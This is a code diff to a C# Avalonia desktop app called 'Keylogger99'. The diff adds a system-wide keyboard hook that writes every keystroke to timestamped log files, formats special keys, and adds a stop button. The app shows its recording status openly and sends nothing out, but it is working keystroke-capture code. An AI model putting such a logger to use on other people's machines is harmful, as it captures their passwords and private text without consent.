@@ -8,6 +8,7 @@ namespace Keylogger99;
 
 public partial class MainWindow : Window
 {
+    private string _currentLogFile = "log.txt";
     private TaskPoolGlobalHook? _hook;
 
     public MainWindow()
@@ -18,26 +19,66 @@ public partial class MainWindow : Window
 
     private void SetupHook()
     {
-        // 1. Initialize the global hook
         _hook = new TaskPoolGlobalHook();
 
-        // 2. Handle the KeyPressed event
+        string timestamp = System.DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
+        _currentLogFile = $"log_{timestamp}.txt";
+
+        System.IO.File.AppendAllText(_currentLogFile, $"--- Session Started: {timestamp} ---\n");
+
         _hook.KeyPressed += (s, e) =>
         {
-            // Get the name of the key (e.g., "A", "Space", "Enter")
-            var keyText = e.Data.KeyCode.ToString();
+            string rawKey = e.Data.KeyCode.ToString().Replace("Vc", "");
+        
+            // IMPROVED FORMATTING HERE
+            string formattedKey = rawKey switch
+            {
+                "Space" => " ",
+                "Enter" => "\n[ENTER]\n",
+                "Backspace" => "[BACKSPACE]",
+                "Tab" => "\t",
+                "LeftShift" or "RightShift" => "", // Ignore shift keys to keep logs clean
+                "Delete" => "[DEL]",
+                _ => rawKey
+            };
 
-            // Mac logic: We must update the UI on the main thread
+            try 
+            {
+                System.IO.File.AppendAllText(_currentLogFile, formattedKey);
+            }
+            catch (System.Exception ex)
+            {
+                System.Console.WriteLine($"Logging Error: {ex.Message}");
+            }
+
             Dispatcher.UIThread.InvokeAsync(() =>
             {
-                KeyLogDisplay.Text += $"{keyText} ";
-                StatusLabel.Text = "Status: Recording...";
+                // This updates the screen in Keylogger99
+                KeyLogDisplay.Text += formattedKey;
+                StatusLabel.Text = $"Status: Recording to {_currentLogFile}";
                 StatusLabel.Foreground = Avalonia.Media.Brushes.Green;
             });
         };
-
-        // 3. Start the hook in the background so the window doesn't freeze
+        
         Task.Run(() => _hook.Run());
+    }
+
+    private void OnStopClick(object sender, RoutedEventArgs e)
+    {
+        if (_hook != null && _hook.IsRunning)
+        {
+            // 1. Actually stop the hardware listener
+            _hook.Dispose(); 
+        
+            // 2. Change the UI so YOU can see it stopped
+            Dispatcher.UIThread.InvokeAsync(() => {
+                StatusLabel.Text = "Status: STOPPED (Not Recording)";
+                StatusLabel.Foreground = Avalonia.Media.Brushes.Red; // Turns the text red
+            });
+
+            // 3. Optional: Add a final line to the log file
+            System.IO.File.AppendAllText(_currentLogFile, "\n--- Session Manually Stopped ---\n");
+        }
     }
 
     private void OnClearClick(object sender, RoutedEventArgs e)
